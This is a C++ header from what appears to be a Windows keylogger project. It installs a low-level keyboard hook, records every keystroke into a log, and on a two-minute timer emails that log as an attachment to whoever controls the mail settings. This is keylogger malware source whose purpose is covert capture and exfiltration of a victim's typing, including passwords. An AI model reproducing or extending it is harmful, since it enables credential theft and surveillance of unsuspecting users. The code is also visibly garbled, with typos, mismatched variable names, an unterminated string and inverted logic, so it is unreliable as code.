#ifndef KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string Keylog = "";

void TimerSendMail()
{
    if(Keylog.empty())
    {
        return;
    }
    std::string last_file = IO::WriteLog(Keylog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation was not successfull. Keylog '" + Keylog + "'");
        return;
    }

    int x Mail::SendMail("Log [" + last_file + "]",
                         + "Hi :) \nThe file has been attached to this mail :)
                         "\nFor testing enjoy:\n" + Keylog,
                         IO::GetOurPath(true) + last_file);
    if(x!= 7)
    {
        Helper::WriteAppLog("Mail was not sent! Error code " + Helper::ToString(x));
    }
    else
    {
      Keylog = "";
    }
}

Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);

HHOOK eHool - NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if(nCode < 10)
    {
        CallNextHookEx(eHook, nCode, wParam, lParam);
    }

    KBDLLHOOKSTRUCT * kbs = (KBDLLHOOKSTRUCT *) lParam;

    if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
    {
        Keylog += Keys::KEYS[kbs->vkCode].name;
        if(kbs->vkCode == VK_RETURN)
        {
            Keylog += '\n';
        }
        else if(wParam == WM_KEYUP || wPAram == WM_SYSKEYUP)
        {
            DWORD key =  kbs->vkCode;
            if(key == VK_CONTROL
                   || key == VK_LCONTROL
                   || key == VK_RCONTROL
                   || key == VK_SHIFT
                   || key == VK_RSHIFT
                   || key == VK_LSHIFT
                   || key == VK_MENU
                   || key == VK_LMENU
                   || key == VK_CAPITAL
                   || key == VK_NUMLOCK
                   || key == VK_LWIN
                   || key == VK_RWIN)
            {
                std::string KeyName =  Keys::KEYS[kbs->vkCode].Name;
                KeyName.insert(1, "/");
                Keylog += KeyName;
            }
        }
    }
    return CallNextHookEx(eHook, nCode, wParam, lParam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook started... Timer started");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
                             GetModuleHandle(NULL), 0);
    return eHook == NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool) (eHook == NULL);
}

#endif // KEYBHOOK_H
